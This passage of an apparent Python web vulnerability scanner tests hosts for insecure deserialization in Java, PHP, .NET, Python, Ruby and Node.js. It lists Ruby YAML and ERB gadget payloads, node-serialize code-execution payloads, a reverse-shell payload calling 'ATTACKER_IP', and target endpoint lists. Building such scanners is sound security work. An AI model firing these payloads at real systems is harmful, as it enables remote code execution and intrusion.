        },
        "datacontractserializer": {
            "description": ".NET DataContractSerializer",
            "note": "Can be dangerous with DataContractResolver",
            "cves": [],
        },
        "xmlserializer": {
            "description": ".NET XmlSerializer",
            "note": "Type injection possible with DataContractResolver",
            "cves": [],
        },
    }
    
    # ==================== RUBY DESERIALIZATION ====================
    
    RUBY_PAYLOADS = {
        "marshal": {
            "description": "Ruby Marshal.load gadgets",
            # Detection payloads
            "detection_gem_installer": base64.b64encode(b'\x04\x08o:\x10Gem::Installer\x00').decode(),
            "detection_openstruct": base64.b64encode(b'\x04\x08o:\x10OpenStruct\x06:\x0b@tablei\x00').decode(),
            # Gadget classes
            "gadgets": [
                "Gem::Installer",
                "Gem::SpecFetcher",
                "Gem::Requirement",
                "Gem::DependencyList",
                "ERB",
                "Net::BufferedIO",
                "Net::WriteAdapter",
                "OpenStruct",
            ],
            "cves": ["CVE-2013-0156", "CVE-2019-5420", "CVE-2021-31799"],
        },
        "yaml": {
            "description": "Ruby YAML.load gadgets",
            "erb_payload": """--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve""",
            # Simpler payload
            "simple_rce": "--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::DependencyList\nspecs:\n- !ruby/object:Gem::Source\n  uri: \"| id\"",
            "cves": ["CVE-2013-0156", "CVE-2021-31799"],
        },
        "erb": {
            "description": "Ruby ERB template injection",
            "payloads": [
                "<%= system('id') %>",
                "<%= `id` %>",
                "<%= IO.popen('id').read %>",
                "<%= %x(id) %>",
                "<%= exec('id') %>",
                "<%= spawn('id') %>",
            ],
        },
        "drb": {
            "description": "Ruby DRb (Distributed Ruby)",
            "note": "Remote method invocation over network",
            "cves": [],
        },
    }
    
    # ==================== NODE.JS DESERIALIZATION ====================
    
    NODEJS_PAYLOADS = {
        "node-serialize": {
            "description": "node-serialize IIFE RCE",
            "payloads": {
                # Immediate Function Invocation Expression (IIFE)
                "iife_rce": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
                "iife_sync": '{"rce":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\').toString();}()"}',
                # Detection without execution
                "detect": '{"test":"_$$ND_FUNC$$_function(){return 1}()"}',
                # Reverse shell
                "reverse_shell": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"\')}()"}',
            },
            "marker": "_$$ND_FUNC$$_",
            "cves": ["CVE-2017-5941"],
        },
        "cryo": {
            "description": "Cryo library prototype pollution and RCE",
            "payloads": {
                "prototype_pollution": '{"__proto__":{"polluted":"yes"}}',
                "rce": '{"__proto__":{"shellcode":"require(\'child_process\').exec(\'id\')"}}',
            },
            "cves": [],
        },
        "funcster": {
            "description": "Funcster library RCE",
            "payloads": {
                "rce": '{"__js_function":"function(){require(\'child_process\').exec(\'id\')}"}',
            },
            "marker": "__js_function",
            "cves": [],
        },
        "serialize-to-js": {
            "description": "serialize-to-js library RCE",
            "payloads": {
                "rce": '{"_function":"(){require(\'child_process\').exec(\'id\')}"}',
            },
            "marker": "_function",
            "cves": [],
        },
        "safe-obj": {
            "description": "safe-obj prototype pollution",
            "payloads": {
                "pollution": '{"__proto__":{"isAdmin":true}}',
            },
            "cves": [],
        },
    }
    
    # ==================== FRAMEWORK SIGNATURES ====================
    
    FRAMEWORK_SIGNATURES = {
        "java_spring": FrameworkSignature(
            name="Spring Framework",
            headers={"X-Application-Context": ""},
            body_patterns=["Whitelabel Error Page", "org.springframework", "Spring Boot"],
            gadget_chains=[GadgetChainType.SPRING_CORE, GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2016-1000027", "CVE-2022-22965", "CVE-2022-22963"],
        ),
        "java_weblogic": FrameworkSignature(
            name="Oracle WebLogic",
            headers={"X-Powered-By": "Servlet"},
            body_patterns=["WebLogic", "wls_redirect", "Error 404--Not Found"],
            gadget_chains=[GadgetChainType.COMMONS_COLLECTIONS, GadgetChainType.JBOSS],
            cves=["CVE-2015-4852", "CVE-2017-10271", "CVE-2018-2628", "CVE-2019-2725", "CVE-2020-2551"],
        ),
        "java_jboss": FrameworkSignature(
            name="JBoss/WildFly",
            headers={"X-Powered-By": "Undertow"},
            body_patterns=["JBoss", "WildFly", "jboss-eap", "JBoss Application Server"],
            gadget_chains=[GadgetChainType.JBOSS, GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2015-7501", "CVE-2017-12149"],
        ),
        "java_jenkins": FrameworkSignature(
            name="Jenkins CI",
            headers={"X-Jenkins": "", "X-Hudson": ""},
            body_patterns=["Jenkins", "hudson", "Jenkins CI"],
            gadget_chains=[GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2015-8103", "CVE-2016-0792", "CVE-2017-1000353", "CVE-2019-17638"],
        ),
        "java_coldfusion": FrameworkSignature(
            name="Adobe ColdFusion",
            cookies=["CFID", "CFTOKEN"],
            body_patterns=["ColdFusion", "coldfusion"],
            gadget_chains=[GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2017-3066", "CVE-2018-4939"],
        ),
        "php_laravel": FrameworkSignature(
            name="Laravel",
            cookies=["laravel_session", "XSRF-TOKEN"],
            body_patterns=["Laravel", "Illuminate\\", "laravel/framework"],
            gadget_chains=[GadgetChainType.LARAVEL_RCE1, GadgetChainType.MONOLOG_RCE1],
            cves=["CVE-2018-15133", "CVE-2021-3129"],
        ),
        "php_symfony": FrameworkSignature(
            name="Symfony",
            headers={"X-Debug-Token": "", "X-Debug-Token-Link": ""},
            body_patterns=["Symfony", "symfony_", "symfony/framework-bundle"],
            gadget_chains=[GadgetChainType.SYMFONY_RCE1, GadgetChainType.MONOLOG_RCE1],
            cves=["CVE-2019-10911", "CVE-2021-21424"],
        ),
        "php_wordpress": FrameworkSignature(
            name="WordPress",
            cookies=["wordpress_logged_in", "wordpress_test_cookie"],
            body_patterns=["wp-content", "wp-includes", "WordPress", "/wp-json/"],
            gadget_chains=[GadgetChainType.WORDPRESS_RCE1],
            cves=["CVE-2019-8942"],
        ),
        "php_magento": FrameworkSignature(
            name="Magento",
            cookies=["frontend", "adminhtml", "PHPSESSID"],
            body_patterns=["Magento", "Mage.", "varien", "/magento/"],
            gadget_chains=[GadgetChainType.MAGENTO_FW1],
            cves=["CVE-2019-8118", "CVE-2021-21389", "CVE-2022-24086"],
        ),
        "php_drupal": FrameworkSignature(
            name="Drupal",
            headers={"X-Generator": "Drupal"},
            body_patterns=["Drupal", "/sites/default/", "/drupal/"],
            gadget_chains=[GadgetChainType.GUZZLE_FW1, GadgetChainType.MONOLOG_RCE1],
            cves=["CVE-2018-7600", "CVE-2019-6340"],
        ),
        "dotnet_sharepoint": FrameworkSignature(
            name="SharePoint",
            headers={"MicrosoftSharePointTeamServices": ""},
            body_patterns=["SharePoint", "_layouts", "SPWeb", "/_vti_bin/"],
            gadget_chains=[GadgetChainType.TYPECONFUSE, GadgetChainType.ACTIVITYSURROGATE],
            cves=["CVE-2019-0604", "CVE-2020-0646", "CVE-2020-16952"],
        ),
        "dotnet_exchange": FrameworkSignature(
            name="Microsoft Exchange",
            headers={"X-OWA-Version": "", "X-FEServer": ""},
            body_patterns=["Exchange", "OWA", "OutlookWebApp", "/owa/"],
            gadget_chains=[GadgetChainType.TYPECONFUSE],
            cves=["CVE-2020-0688", "CVE-2021-26855", "CVE-2021-27065"],
        ),
        "dotnet_sitecore": FrameworkSignature(
            name="Sitecore CMS",
            cookies=["SC_ANALYTICS_GLOBAL_COOKIE"],
            body_patterns=["Sitecore", "/sitecore/"],
            gadget_chains=[GadgetChainType.TYPECONFUSE],
            cves=["CVE-2021-42237"],
        ),
        "ruby_rails": FrameworkSignature(
            name="Ruby on Rails",
            headers={"X-Runtime": "", "X-Request-Id": ""},
            cookies=["_session_id"],
            body_patterns=["Rails", "ActiveRecord", "ActionController", "Ruby on Rails"],
            gadget_chains=[],
            cves=["CVE-2013-0156", "CVE-2019-5420", "CVE-2020-8165"],
        ),
        "node_express": FrameworkSignature(
            name="Express.js",
            headers={"X-Powered-By": "Express"},
            body_patterns=[],
            gadget_chains=[],
            cves=[],
        ),
    }
    
    # ==================== COMMON SERIALIZATION ENTRY POINTS ====================
    
    SERIALIZATION_POINTS = [
        # ASP.NET
        "__VIEWSTATE",
        "__VIEWSTATEGENERATOR",
        "__EVENTVALIDATION",
        "__EVENTTARGET",
        "__EVENTARGUMENT",
        # Generic parameters
        "viewstate",
        "session",
        "token",
        "data",
        "object",
        "payload",
        "state",
        "auth",
        "user",
        "profile",
        "settings",
        "config",
        "serialized",
        "base64",
        "encoded",
        "obj",
        "pickle",
        "marshal",
        "yaml",
        "json",
        "rpc",
        # Java-specific
        "javaSerializedData",
        "serObj",
        "serializedObject",
        "javaObject",
        "objectData",
        # PHP-specific
        "phpSerialized",
        "serialize",
        "unserialized",
        # Cookies commonly containing serialized data
        "JSESSIONID",
        "PHPSESSID",
        "ASP.NET_SessionId",
        "rack.session",
        "laravel_session",
        "_session",
        "session_id",
        "remember_token",
        "auth_token",
        "cart",
        "basket",
        "preferences",
        # API parameters
        "body",
        "request",
        "message",
        "content",
    ]
    
    # ==================== JAVA ENDPOINTS TO TEST ====================
    
    JAVA_ENDPOINTS = [
        # JMX endpoints
        "/jmx",
        "/jmx-console",
        "/jmx-console/HtmlAdaptor",
        "/jolokia",
        "/jolokia/exec",
        "/jolokia/read",
        # RMI endpoints
        "/rmi",
        "/rmi-server",
        "/registry",
        # T3/IIOP (WebLogic)
        "/wls",
        "/wls-wsat",
        "/wls-wsat/CoordinatorPortType",
        "/wls-wsat/CoordinatorPortType11",
        "/_async/AsyncResponseService",
        "/console",
        "/console/login/LoginForm.jsp",
        "/console/css/%252e%252e/consolejndi.portal",
        # Jenkins
        "/jenkins/script",
        "/script",
        "/computer/(master)/script",
        "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
        # Spring Boot Actuator
        "/actuator",
        "/actuator/env",
        "/actuator/heapdump",
        "/actuator/gateway/routes",
        "/env",
        "/trace",
        "/mappings",
        # JBoss
        "/invoker/JMXInvokerServlet",
        "/invoker/EJBInvokerServlet",
        "/invoker/readonly",
        "/jbossmq-httpil/HTTPServerILServlet",
        "/web-console/",
        "/admin-console/",
        # Generic Java
        "/axis",
        "/axis2",
        "/axis2-admin",
        "/axis2-web",
        "/faces",
        "/faces/javax.faces.resource",
        "/admin",
        "/manager",
        "/manager/html",
        "/status",
        "/probe",
        # Apache Struts
        "/struts",
        "/struts2-showcase",
        # Apache Solr
        "/solr",
        "/solr/admin",
    ]
    
    # ==================== PHP ENDPOINTS TO TEST ====================
    
    PHP_ENDPOINTS = [
        # Magento
        "/index.php/admin",
        "/downloader",
        "/admin",
        "/magento_admin",
        # WordPress
        "/wp-admin",
        "/wp-login.php",
        "/xmlrpc.php",
        "/wp-json",
        # Laravel
        "/_ignition/execute-solution",
        "/_ignition/health-check",
        "/telescope",
        "/horizon",
        # Symfony
        "/_profiler",
        "/_wdt",
        "/_fragment",
        # Drupal
        "/admin",
        "/user/login",
        "/node/add",
        # Joomla
        "/administrator",
        "/administrator/index.php",
        # PHPMyAdmin
        "/phpmyadmin",
        "/pma",
        "/mysql",
        # Generic
        "/admin.php",
        "/config.php",
        "/setup.php",
        "/install.php",
    ]
    
    # ==================== KNOWN CVEs DATABASE ====================
    
    CVE_DATABASE = {
        # Java CVEs
        "CVE-2015-4852": {
            "name": "WebLogic T3 Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0",
            "gadget": "CommonsCollections",
            "description": "T3 protocol deserialization allows remote code execution",
        },
        "CVE-2015-7501": {
            "name": "JBoss/JMXInvokerServlet Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "JBoss, Red Hat JBoss, multiple versions",
            "gadget": "CommonsCollections",
            "description": "JMXInvokerServlet accepts untrusted serialized objects",
        },
        "CVE-2017-12149": {
            "name": "JBoss ReadOnlyAccessFilter Bypass",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "JBoss Application Server",
            "gadget": "CommonsCollections",
            "description": "Bypass of readonly filter allows deserialization attacks",
        },
        "CVE-2018-2628": {
            "name": "WebLogic WLS Security Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server",
            "gadget": "JRMPClient",
            "description": "T3 protocol RMI deserialization vulnerability",
        },
        "CVE-2019-2725": {
            "name": "WebLogic wls9_async_response Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server 10.3.6.0, 12.1.3.0",
            "gadget": "Spring",
            "description": "Async response handler deserialization RCE",
        },
        "CVE-2020-2551": {
            "name": "WebLogic IIOP Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.3.0, 12.2.1.4.0",
            "gadget": "Multiple",
            "description": "IIOP protocol deserialization vulnerability",
        },
        "CVE-2022-22965": {
            "name": "Spring4Shell",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Spring Framework < 5.3.18, < 5.2.20",
            "gadget": "Spring",
            "description": "RCE via data binding to ClassLoader",
        },
        # .NET CVEs
        "CVE-2020-0688": {
            "name": "Exchange Control Panel ViewState Deserialization",
            "severity": "CRITICAL",
            "cvss": 8.8,
            "affected": "Microsoft Exchange Server 2010-2019",
            "gadget": "TypeConfuseDelegate",
            "description": "Static cryptographic key enables ViewState RCE",
        },
        "CVE-2019-0604": {
            "name": "SharePoint Deserialization RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Microsoft SharePoint 2010-2019",
            "gadget": "ActivitySurrogateSelector",
            "description": "Server-side deserialization of untrusted data",
        },
        "CVE-2020-1147": {
            "name": ".NET DataSet XML Deserialization",
            "severity": "HIGH",
            "cvss": 7.8,
            "affected": ".NET Framework, .NET Core, SharePoint",
            "gadget": "DataSet",
            "description": "XML deserialization in DataSet allows RCE",
        },
        "CVE-2021-42237": {
            "name": "Sitecore XP RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Sitecore XP 7.5-8.2",
            "gadget": "TypeConfuseDelegate",
            "description": "Deserialization vulnerability in Report.ashx",
        },
        # PHP CVEs
        "CVE-2021-3129": {
            "name": "Laravel Ignition RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Laravel Framework with Ignition < 2.5.2",
            "gadget": "Laravel",
            "description": "Phar deserialization via log file",
        },
        "CVE-2018-15133": {
            "name": "Laravel Unserialize RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Laravel Framework < 5.6.30",
            "gadget": "Laravel",
            "description": "APP_KEY exposure enables cookie deserialization RCE",
        },
        "CVE-2019-10911": {
            "name": "Symfony Cache Component RCE",
            "severity": "HIGH",
            "cvss": 8.1,
            "affected": "Symfony < 4.2.7",
            "gadget": "Symfony",
            "description": "Insecure unserialize in cache adapter",
        },
        "CVE-2020-15148": {
            "name": "Yii Framework Unserialize RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Yii 2.0 < 2.0.38",
            "gadget": "Yii",
            "description": "Unsafe deserialization in BatchQueryResult",
        },
        # Node.js CVEs
        "CVE-2017-5941": {
            "name": "node-serialize Code Execution",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "node-serialize npm package",
            "gadget": "NodeSerialize",
            "description": "IIFE execution during deserialization",
        },
        # Ruby CVEs
        "CVE-2013-0156": {
            "name": "Rails XML/YAML Parsing RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Ruby on Rails < 3.2.11, < 3.1.10, < 3.0.19, < 2.3.15",
            "gadget": "YAML",
            "description": "Arbitrary object instantiation via XML/YAML parameters",
        },
        "CVE-2019-5420": {
            "name": "Rails File Content Disclosure",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Ruby on Rails < 5.2.2.1, < 5.1.6.2, < 5.0.7.2",
            "gadget": "Marshal",
            "description": "Development mode secret disclosure enables RCE",
        },
        # Python CVEs
        "CVE-2020-1747": {
            "name": "PyYAML Arbitrary Code Execution",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "PyYAML < 5.3.1",
            "gadget": "YAML",
            "description": "full_load allows arbitrary code execution",
        },
        "CVE-2017-18342": {
            "name": "PyYAML load() Unsafe by Default",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "PyYAML < 5.1",
            "gadget": "YAML",
            "description": "Default load() function allows arbitrary code execution",
        },
    }
    
    # Legacy compatibility aliases
    DETECTION_PAYLOADS = {
        "java": {
            "urldns": JAVA_GADGET_PAYLOADS[GadgetChainType.URLDNS]["base64"],
            "sleep": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/",
        },
        "php": {
            "basic": 'O:8:"stdClass":0:{}',
            "guzzle": PHP_GADGET_PAYLOADS[GadgetChainType.GUZZLE_FW1]["payloads"]["detect"],
            "monolog": PHP_GADGET_PAYLOADS[GadgetChainType.MONOLOG_RCE1]["payloads"]["detect"],
            "symfony": PHP_GADGET_PAYLOADS[GadgetChainType.SYMFONY_RCE1]["payloads"]["detect"],
        },
        "python": {
            "pickle_exec": PYTHON_PAYLOADS["pickle"]["rce_exec_v0"],
            "pickle_class": PYTHON_PAYLOADS["pickle"]["safe_detect"],
        },
        "dotnet": {
            "typeconfuse": DOTNET_PAYLOADS["binaryformatter"]["detection_payload"],
        },
        "ruby": {
            "marshal": RUBY_PAYLOADS["marshal"]["detection_gem_installer"],
        },
        "node": {
            "serialize": NODEJS_PAYLOADS["node-serialize"]["payloads"]["iife_rce"],
        },
    }
    
    def __init__(self, settings: Settings) -> None:
        super().__init__(settings)
        self.timeout = settings.timeouts.request_timeout
        self.detected_framework: FrameworkSignature | None = None
        self.test_results: list[DeserTestResult] = []
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Comprehensive deserialization vulnerability scan.
        
        Tests multiple serialization formats and language-specific gadgets.
        """
        findings: list[Finding] = []
        self.test_results = []
        
        base_url = f"https://{host}" if not host.startswith("http") else host
        urls = asset_data.get("urls", [base_url])
        
        async with httpx.AsyncClient(
            verify=False,
            timeout=self.timeout,
            follow_redirects=True,
        ) as client:
            # Phase 1: Framework detection
            framework_findings = await self._detect_framework(
                client, base_url, urls, rate_limiter
            )
            findings.extend(framework_findings)
            
            # Phase 2: Detect serialization usage
            detection_findings = await self._detect_serialization(
                client, base_url, urls, rate_limiter
            )
            findings.extend(detection_findings)
            
            # Phase 3: Test Java deserialization
            java_findings = await self._test_java_deserialization(
                client, base_url, urls, rate_limiter
            )
            findings.extend(java_findings)
            
            # Phase 4: Test PHP object injection
            php_findings = await self._test_php_object_injection(
                client, base_url, urls, rate_limiter
            )
            findings.extend(php_findings)
            
            # Phase 5: Test .NET ViewState
            viewstate_findings = await self._test_viewstate(
                client, base_url, urls, rate_limiter
            )
            findings.extend(viewstate_findings)
            
            # Phase 6: Test .NET Json.NET
            jsonnet_findings = await self._test_dotnet_jsonnet(
                client, base_url, urls, rate_limiter
            )
            findings.extend(jsonnet_findings)
            
            # Phase 7: Test Python pickle
            pickle_findings = await self._test_python_pickle(
                client, base_url, urls, rate_limiter
            )
            findings.extend(pickle_findings)
            
            # Phase 8: Test Python YAML
            yaml_findings = await self._test_python_yaml(
                client, base_url, urls, rate_limiter
            )
            findings.extend(yaml_findings)
            
            # Phase 9: Test Ruby deserialization
            ruby_findings = await self._test_ruby_deserialization(
                client, base_url, urls, rate_limiter
            )
            findings.extend(ruby_findings)
            
            # Phase 10: Test Node.js serialize
            node_findings = await self._test_node_serialize(
                client, base_url, urls, rate_limiter
            )
            findings.extend(node_findings)
            
            # Phase 11: Test known CVEs
            cve_findings = await self._test_known_cves(
                client, base_url, rate_limiter
            )
            findings.extend(cve_findings)
        
        return findings
    
    async def _detect_framework(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Detect the underlying framework for targeted testing."""
        findings = []
        
        await rate_limiter.acquire()
        
        try:
            response = await client.get(base_url)
            headers = dict(response.headers)
            cookies = list(response.cookies.keys())
            body = response.text.lower()
            
            for sig_name, signature in self.FRAMEWORK_SIGNATURES.items():
                matched = False
                evidence = []
                
                # Check headers
                for header_name in signature.headers:
                    if header_name.lower() in [h.lower() for h in headers]:
                        matched = True
                        evidence.append(f"Header: {header_name}")
                
                # Check cookies
                for cookie in signature.cookies:
                    if cookie.lower() in [c.lower() for c in cookies]:
                        matched = True
                        evidence.append(f"Cookie: {cookie}")
                
                # Check body patterns
                for pattern in signature.body_patterns:
                    if pattern.lower() in body:
                        matched = True
                        evidence.append(f"Body pattern: {pattern}")
                
                if matched:
                    self.detected_framework = signature
                    
                    # Report framework with known gadget chains
                    if signature.gadget_chains:
                        chains = [gc.value for gc in signature.gadget_chains[:3]]
                        findings.append(Finding(
                            name=f"{signature.name} Framework Detected",
                            severity="INFO",
                            confidence="HIGH",
                            description=f"{signature.name} detected. Known deserialization gadgets available.",
                            matched_at=base_url,
                            evidence=evidence + [f"Potential gadgets: {', '.join(chains)}"],
                            cwe="CWE-502",
                            remediation=f"Ensure {signature.name} is patched and deserialization is secure.",
                        ))
                    
                    # Check for known CVEs
                    if signature.cves:
                        findings.append(Finding(
                            name=f"{signature.name} Potential CVE Exposure",
                            severity="HIGH",
                            confidence="LOW",
                            description=f"{signature.name} has known deserialization CVEs",
                            matched_at=base_url,
                            evidence=[f"Known CVEs: {', '.join(signature.cves[:5])}"],
                            cwe="CWE-502",
                            remediation=f"Verify {signature.name} version and apply security patches.",
                        ))
                    
                    break  # Use first matched framework
                    
        except Exception as e:
            logger.debug(f"Error detecting framework: {e}")
        
        return findings
    
    async def _detect_serialization(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Detect serialization usage in application."""
        findings = []
        
        for url in urls[:20]:
            await rate_limiter.acquire()
            
            try:
                response = await client.get(url)
                
                # Check for Java serialized data
                if self.JAVA_MAGIC_B64 in response.text:
                    findings.append(Finding(
                        name="Java Serialized Data Detected",
                        severity="HIGH",
                        confidence="HIGH",
                        description="Application uses Java serialization which may be vulnerable",
                        matched_at=url,
                        evidence=["Java serialized object pattern (rO0AB) found in response"],
                        cwe="CWE-502",
                        cvss_score=8.1,
                        remediation="Replace Java serialization with safe alternatives like JSON. "
                                   "If serialization is required, implement look-ahead validation.",
                    ))
                
                # Check for PHP serialized data
                if self.PHP_SERIALIZE_PATTERN.search(response.text):
                    findings.append(Finding(
                        name="PHP Serialized Data Detected",
                        severity="HIGH",
                        confidence="MEDIUM",
                        description="Application appears to use PHP serialization",
                        matched_at=url,
                        evidence=["PHP serialization pattern (O:N:, a:N:, etc.) found"],
                        cwe="CWE-502",
                        cvss_score=8.1,
                        remediation="Use json_encode/json_decode instead of serialize/unserialize.",
                    ))
                
                # Check for Python pickle markers
                pickle_b64_indicators = ["gASV", "gAJV", "gANV", "gARV", "gAUV"]  # Protocol markers
                for indicator in pickle_b64_indicators:
                    if indicator in response.text:
                        findings.append(Finding(
                            name="Python Pickle Data Detected",
                            severity="HIGH",
                            confidence="MEDIUM",
                            description="Application appears to use Python pickle serialization",
                            matched_at=url,
                            evidence=[f"Pickle base64 pattern ({indicator}) found"],
                            cwe="CWE-502",
                            cvss_score=8.1,
                            remediation="Never use pickle.loads() on untrusted data. Use JSON instead.",
                        ))
                        break
                
                # Check for Ruby Marshal
                marshal_b64 = "BAg"  # \x04\x08 in base64
                if marshal_b64 in response.text:
                    findings.append(Finding(
                        name="Ruby Marshal Data Detected",
                        severity="HIGH",
                        confidence="LOW",
                        description="Application may use Ruby Marshal serialization",
                        matched_at=url,
                        evidence=["Ruby Marshal magic bytes pattern found"],
                        cwe="CWE-502",
                        cvss_score=8.1,
                        remediation="Use JSON instead of Marshal.load on untrusted data.",
                    ))
                
                # Check cookies for serialized data
                for cookie_name, cookie_value in response.cookies.items():
                    # Try base64 decode and check
                    try:
                        decoded = base64.b64decode(cookie_value)
                        
                        if decoded.startswith(self.JAVA_MAGIC):
                            findings.append(Finding(
                                name="Java Serialized Cookie",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description=f"Cookie '{cookie_name}' contains Java serialized object",
                                matched_at=url,
                                evidence=[
                                    f"Cookie: {cookie_name}",
                                    "Java magic bytes (0xACED) detected",
                                ],
                                cwe="CWE-502",
                                cvss_score=9.8,
                                remediation="Never store serialized objects in cookies. Use secure session management.",
                            ))
                        
                        if decoded.startswith(self.RUBY_MARSHAL_MAGIC):
                            findings.append(Finding(
                                name="Ruby Marshal Cookie",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description=f"Cookie '{cookie_name}' contains Ruby Marshal data",
                                matched_at=url,
                                evidence=[f"Cookie: {cookie_name}"],
                                cwe="CWE-502",
                                cvss_score=9.8,
                                remediation="Use secure session storage instead of Marshal cookies.",
                            ))
                            
                    except Exception:
                        pass
                    
                    # Check for PHP serialization in cookie (not base64)
                    if self.PHP_SERIALIZE_PATTERN.search(cookie_value):
                        findings.append(Finding(
                            name="PHP Serialized Cookie",
                            severity="CRITICAL",
                            confidence="HIGH",
                            description=f"Cookie '{cookie_name}' contains PHP serialized data",
                            matched_at=url,
                            evidence=[f"Cookie: {cookie_name}"],
                            cwe="CWE-502",
                            cvss_score=9.8,
                            remediation="Never use unserialize() on user-controlled cookies.",
                        ))
                    
                    # Check for node-serialize marker
                    if "_$$ND_FUNC$$_" in cookie_value:
                        findings.append(Finding(
                            name="Node.js node-serialize Cookie",
                            severity="CRITICAL",
                            confidence="HIGH",
                            description=f"Cookie '{cookie_name}' contains node-serialize data",
                            matched_at=url,
                            evidence=[f"Cookie: {cookie_name}", "IIFE marker detected"],
                            cwe="CWE-502",
                            cvss_score=9.8,
                            remediation="Remove node-serialize. Use JSON.parse/stringify instead.",
                        ))
                        
            except Exception as e:
                logger.debug(f"Error detecting serialization: {e}")
        
        return findings
    
    async def _test_java_deserialization(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for Java deserialization vulnerabilities."""
        findings = []
        
        # Test common Java endpoints
        for endpoint in self.JAVA_ENDPOINTS[:15]:
            await rate_limiter.acquire()
            
            try:
                url = urljoin(base_url, endpoint)
                
                # Send Java serialized payload
                payload = base64.b64decode(self.DETECTION_PAYLOADS["java"]["urldns"])
                
                headers = {
                    "Content-Type": "application/x-java-serialized-object",
                }
                
                response = await client.post(url, content=payload, headers=headers)
                
                # Check for deserialization indicators
                if response.status_code in [200, 500]:
                    error_indicators = [
                        "ClassNotFoundException",
                        "InvalidClassException",
                        "StreamCorruptedException",
                        "java.io.ObjectInputStream",
                        "readObject",
                        "DeserializationException",
                        "org.apache.commons.collections",
                        "InvokerTransformer",
                        "UnmarshalException",
                    ]
                    
                    for indicator in error_indicators:
                        if indicator in response.text:
                            # Determine likely gadget chains
                            gadgets = []
                            if "commons.collections" in response.text.lower():
                                gadgets.append("CommonsCollections")
                            if "springframework" in response.text.lower():
                                gadgets.append("Spring")
                            
                            findings.append(Finding(
                                name="Java Deserialization Endpoint",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description=f"Endpoint accepts Java serialized objects: {endpoint}",
                                matched_at=url,
                                evidence=[
                                    f"Error indicator: {indicator}",
                                    f"Potential gadgets: {', '.join(gadgets) or 'Unknown'}",
                                    "Endpoint processes serialized Java objects",
                                ],
                                cwe="CWE-502",
                                cvss_score=9.8,
                                remediation="Disable Java serialization endpoints or implement strict "
                                           "class filtering with ObjectInputFilter.",
                            ))
                            
                            self.test_results.append(DeserTestResult(
                                vuln_type=DeserVulnType.JAVA_OBJECT,
                                endpoint=endpoint,
                                evidence=[indicator],
                                error_based=True,
                            ))
                            break
                            
            except Exception as e:
                logger.debug(f"Error testing Java endpoint {endpoint}: {e}")
        
        # Test parameters that might accept serialized data
        for url in urls[:10]:
            for param in self.SERIALIZATION_POINTS[:10]:
                await rate_limiter.acquire()
                
                try:
                    payload = self.DETECTION_PAYLOADS["java"]["urldns"]
                    test_url = f"{url}?{param}={quote(payload)}"
                    
                    response = await client.get(test_url)
                    
                    java_indicators = [
                        "ClassNotFoundException",
                        "java.io",
                        "ObjectInputStream",
                        "InvalidClassException",
                        "readObject",
                    ]
                    
                    if any(ind in response.text for ind in java_indicators):
                        findings.append(Finding(
                            name="Java Deserialization in Parameter",
                            severity="CRITICAL",
                            confidence="HIGH",
                            description=f"Parameter '{param}' processes Java serialized data",
                            matched_at=url,
                            evidence=[f"Parameter: {param}", "Java deserialization detected"],
                            cwe="CWE-502",
                            cvss_score=9.8,
                            remediation="Never deserialize untrusted Java objects from user input.",
                        ))
                        
                except Exception as e:
                    logger.debug(f"Error testing Java param: {e}")
        
        return findings
    
